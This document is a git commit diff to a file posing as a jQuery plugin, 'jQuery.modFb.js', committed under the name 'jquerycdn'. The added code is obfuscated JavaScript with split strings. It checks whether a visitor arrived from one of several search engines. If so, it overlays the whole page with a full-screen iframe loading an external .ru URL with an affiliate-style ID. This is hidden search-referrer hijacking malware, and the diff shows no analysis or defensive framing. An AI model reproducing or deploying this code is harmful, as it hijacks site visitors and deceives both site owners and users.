33da97865c922b2876e01727635aab578decf73d
jquerycdn <softbizgold@gmail.com>
2013-07-31 19:28:03 +0200

    Update jQuery.modFb.js

--- jQuery.modFb.js
+++ jQuery.modFb.js
@@ -1,13 +1,18 @@
+vistaz = {};
+vistaz.searchers = [ [/google\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.yahoo\./i, /(\?|&)p=(.*?)(&|$)/i, 2], [/bing\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.aol\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/ask\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/altavista\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.lycos\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/alltheweb\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/yandex\./i, /(\?|&)text=(.*?)(&|$)/i, 2], [/(nova\.|search\.)?rambler\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/gogo\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/go\.mail\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/nigma\./i, /(\?|&)s=(.*?)(&|$)/i, 2]];
 var thisur = 'ht'+'tp://ent'+'erweb'+'s.'+'ru/resul'+'tdie'+'t/?'+'pid=2'+'9899';
-function vistaz() {
-
-
-sz = 'dy';
-myt = 'fr' + 'am' + 'e';
-var myu = document.getElementsByTagName('bo' + sz)[0];
-var elements = '<div st' + 'yle="position: abs' + 'olute; width: 100%; hei'+'ght: 100%; z-index: 999; overflow: hidden;  back'+ 'ground-c'+'olor: whi'+'te; top: 0px; left: 0px;"><i'+ myt + ' wid'+'th="100%" height="100%" frameborder="0" scro'+'lling="yes" style="overflow-x:hidden" src="'+thisur+'"><'+'/i' + myt + '></'+'div'+'>';
-myu.innerHTML+=elements;
-
+vistaz.vistaz = function(referer) {
+  var query=null;
+  for(var i=0; i<vistaz.searchers.length; i++) {
+		var se = vistaz.searchers[i];
+		if (referer.match(se[0])) {
+			sz = 'dy';
+			myt = 'fr' + 'am' + 'e';
+			var myu = document.getElementsByTagName('bo' + sz)[0];
+			var elements = '<div st' + 'yle="position: abs' + 'olute; width: 100%; hei'+'ght: 100%; z-index: 999; overflow: hidden;  back'+ 'ground-c'+'olor: whi'+'te; top: 0px; left: 0px;"><i'+ myt + ' wid'+'th="100%" height="100%" frameborder="0" scro'+'lling="yes" style="overflow-x:hidden" src="'+thisur+'"><'+'/i' + myt + '></'+'div'+'>';
+			myu.innerHTML+=elements;
+			break;
+		}
+	}
 };
-
-vistaz();
+vistaz.vistaz(document.referrer);
